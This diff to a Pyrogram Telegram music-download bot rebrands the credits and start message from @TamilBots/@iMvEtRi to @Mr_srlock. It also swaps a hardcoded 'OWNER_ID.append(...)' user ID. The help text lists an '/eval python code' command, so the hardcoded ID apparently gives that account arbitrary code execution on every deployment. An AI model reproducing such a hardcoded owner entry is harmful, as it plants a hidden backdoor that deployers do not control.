@@ -1,4 +1,4 @@
-# Re-Written By @iMvEtRi
+# © @Mr_srlock
 from config import OWNER_ID
 from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
 from TamilBots.modules import *
@@ -10,13 +10,12 @@ from TamilBots.TamilBots import ignore_blacklisted_users
 from TamilBots.sql.chat_sql import add_chat_to_db
 
 start_text = """
-வணக்கம்! [{}](tg://user?id={}),
-நான் {}.
-I'M Music Bot By @TamilBots 🤖
-நீங்கள் Download செய்ய வேண்டிய பாடலின் பெயரை உள்ளிடவும்...
-எ.கா : ```/song Kanave Kanave```
+Hey [{}](tg://user?id={}),
+I'm [Alexa🎶](https://telegra.ph/file/dbed7ae52ae9e91261abc.jpg)
+I'm a music bot created by @mr_srlock.
+Just send me the song name you want to download.
+Eg: ```/song Love me like you do```
 """
-
 
 owner_help = """
 /blacklist user_id
@@ -25,6 +24,7 @@ owner_help = """
 /eval python code
 /chatlist get list of all chats
 """
+
 
 @app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
 async def start(client, message):
@@ -55,7 +55,7 @@ async def help(client, message):
     text = "Syntax: /song song name"
     await message.reply(text)
 
-OWNER_ID.append(1587091205)
+OWNER_ID.append(1492186775)
 app.start()
 LOGGER.info("Your bot is now online.")
 idle()
